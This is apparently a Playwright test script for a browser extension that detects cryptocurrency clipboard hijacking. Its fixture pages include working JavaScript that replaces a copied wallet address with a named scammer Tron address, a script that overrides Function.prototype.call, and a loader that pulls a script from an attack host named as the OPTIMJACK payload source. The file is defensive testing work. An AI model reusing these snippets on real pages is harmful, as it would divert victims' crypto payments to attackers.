"""Browser test of the ScamHunter Guard extension in real Chromium (Playwright).
    python test_extension_browser.py
Skips (exit 0 with a note) when Playwright/Chromium isn't installed.
"""
import os, sys, tempfile, threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
ROOT = os.path.dirname(os.path.abspath(__file__))
EXT = os.path.join(ROOT, "extension")
try:
    from playwright.sync_api import sync_playwright
except ImportError:
    print("SKIP: playwright not installed"); sys.exit(0)

BAD = "THvs6p56XkUiMkJeSc51cAP64u2RsTYqxa"          # OPTIMJACK Tron address
GOOD = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"          # an ordinary Tron address (USDT contract)
PAGES = {
 "/swap": f"""<html><body><p id=a>Deposit to: {GOOD}</p><script>
   document.addEventListener('copy', e => {{ e.clipboardData.setData('text/plain', '{BAD}'); e.preventDefault(); }});
 </script></body></html>""",
 "/swapnew": f"""<html><body><p id=a>Send to wallet {GOOD}</p><script>
   document.addEventListener('copy', e => {{ e.clipboardData.setData('text/plain', 'TXYZ1111111111111111111111111111ab'.slice(0,0) + 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7'); e.preventDefault(); }});
 </script></body></html>""",
 "/honest": f"""<html><body><p id=a>Deposit to: {GOOD}</p></body></html>""",
 "/tamper": """<html><body><p>shop</p><script>const c=Function.prototype.call; Function.prototype.call=function(){return c.apply(this,arguments)};</script></body></html>""",
 "/attackhost": """<html><body><p>news</p><script>var s=document.createElement('script');s.src='http://1688360.cc/track.js';document.head.appendChild(s);</script></body></html>""",
 "/badaddr": f"""<html><body><p>Our deposit wallet: {BAD}</p></body></html>""",
 "/paste": """<html><body><input id=i></body></html>""",
}
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        b = PAGES.get(self.path.split("?")[0], "<html><body>x</body></html>").encode()
        self.send_response(200); self.send_header("Content-Type", "text/html"); self.end_headers(); self.wfile.write(b)
    def log_message(self, *a): pass
srv = ThreadingHTTPServer(("127.0.0.1", 0), H); threading.Thread(target=srv.serve_forever, daemon=True).start()
BASE = f"http://localhost:{srv.server_address[1]}"

ok = lambda c, m: print(("PASS " if c else "FAIL ") + m) or bool(c)
r = []
BANNER = """() => { const h = document.querySelector('[data-scamhunter]'); return h && h.shadowRoot ? h.shadowRoot.textContent : ''; }"""
COPY = """() => { const p = document.getElementById('a'); const rg = document.createRange(); rg.selectNodeContents(p);
  const s = getSelection(); s.removeAllRanges(); s.addRange(rg);
  document.dispatchEvent(new ClipboardEvent('copy', {clipboardData: new DataTransfer(), bubbles: true, cancelable: true})); }"""

with sync_playwright() as p:
    ctx = p.chromium.launch_persistent_context(tempfile.mkdtemp(), headless=True, channel="chromium",
            args=[f"--disable-extensions-except={EXT}", f"--load-extension={EXT}"])
    ctx.route("**/1688360.cc/**", lambda route: route.fulfill(status=200, content_type="application/javascript", body="/*payload*/"))
    sw = ctx.service_workers[0] if ctx.service_workers else ctx.wait_for_event("serviceworker", timeout=15000)
    r.append(ok(sw is not None, "extension loaded (service worker running)"))
    sw.evaluate("refreshFeed()")
    feed_n = sw.evaluate("chrome.storage.local.get('feed').then(r => Object.keys(r.feed.addresses).length)")
    r.append(ok(feed_n >= 8, f"built-in attack list loaded without the Desk ({feed_n} addresses)"))

    def visit(path, action=None, wait=2500):
        pg = ctx.new_page(); pg.goto(BASE + path); pg.wait_for_timeout(800)
        if action: pg.evaluate(action)
        pg.wait_for_timeout(wait)
        t = pg.evaluate(BANNER); pg.close(); return t

    t = visit("/swap", COPY)
    r.append(ok("swapped the address you copied" in t and "OPTIMJACK" in t, "OPTIMJACK-style copy swap caught and named"))
    t = visit("/swapnew", COPY)
    r.append(ok("swapped the address you copied" in t, "a swap to an address NO list knows yet is still caught (behaviour, not a list)"))
    t = visit("/honest", COPY)
    r.append(ok(t == "", "an honest page that lets you copy normally: no warning"))
    t = visit("/tamper", None, 2500)
    r.append(ok("altered core browser functions" in t, "page replacing Function.prototype.call (OPTIMJACK trick) flagged"))
    t = visit("/attackhost", None, 2500)
    r.append(ok("known attack code" in t and "1688360.cc" in t, "page loading the OPTIMJACK payload host, added at runtime, flagged"))
    t = visit("/badaddr", None, 3000)
    r.append(ok("known scammer" in t, "page showing a known scammer address flagged"))
    pg = ctx.new_page(); pg.goto(BASE + "/paste"); pg.wait_for_timeout(800)
    blocked = pg.evaluate(f"""() => {{ const i = document.getElementById('i'); i.focus(); const dt = new DataTransfer(); dt.setData('text/plain', '{BAD}');
        const ev = new ClipboardEvent('paste', {{clipboardData: dt, bubbles: true, cancelable: true}}); i.dispatchEvent(ev); return ev.defaultPrevented; }}""")
    pg.wait_for_timeout(500); t = pg.evaluate(BANNER); pg.close()
    r.append(ok(blocked and "Paste blocked" in t, "pasting a known scammer address is blocked"))
    ctx.close()
srv.shutdown()
print(f"{sum(r)}/{len(r)} passed")
sys.exit(0 if all(r) else 1)
